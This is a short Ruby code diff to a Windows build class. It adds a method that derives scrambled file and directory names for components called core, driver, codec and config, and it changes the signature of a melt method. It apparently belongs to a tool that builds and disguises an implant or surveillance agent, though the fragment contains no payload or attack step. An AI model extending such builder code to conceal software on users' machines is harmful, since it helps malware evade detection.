@@ -30,10 +30,27 @@ class BuildWindows < Build
   end
 
   def scramble
-    trace :debug, "#{self.class} #{__method__}"
+    trace :debug, "Build: scrambling"
+
+    core = scramble_name(@factory.seed, 3)
+    core_backup = scramble_name(core, 32)
+    dir = scramble_name(core[0..7], 7)
+    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
+    codec = scramble_name(config, 2)
+    driver = scramble_name(config, 4)
+    driver64 = scramble_name(config, 16)
+    core64 = scramble_name(config, 15)
+
+    @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
+                  dir: dir, config: config, codec: codec }
+
+    # call the super which will actually do the renaming
+    # starting from @outputs and @scrambled
+    super
+    
   end
 
-  def melt
+  def melt(params)
     trace :debug, "#{self.class} #{__method__}"
   end
 
